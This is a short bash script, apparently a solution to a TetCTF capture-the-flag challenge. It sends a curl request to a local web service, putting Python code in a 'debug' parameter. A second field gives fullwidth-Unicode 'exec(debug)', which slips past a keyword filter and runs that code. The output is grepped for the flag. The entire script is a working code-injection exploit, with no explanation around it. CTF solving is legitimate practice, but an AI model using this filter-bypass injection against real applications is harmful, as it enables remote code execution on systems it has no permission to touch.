#!/bin/bash

curl "http://localhost:5000/?debug=import+__main__;__main__.fail=__main__.FL4G" -F "type=FL4G" -F "number=ｅｘｅｃ(ｄｅｂｕｇ)" | grep "TetCTF"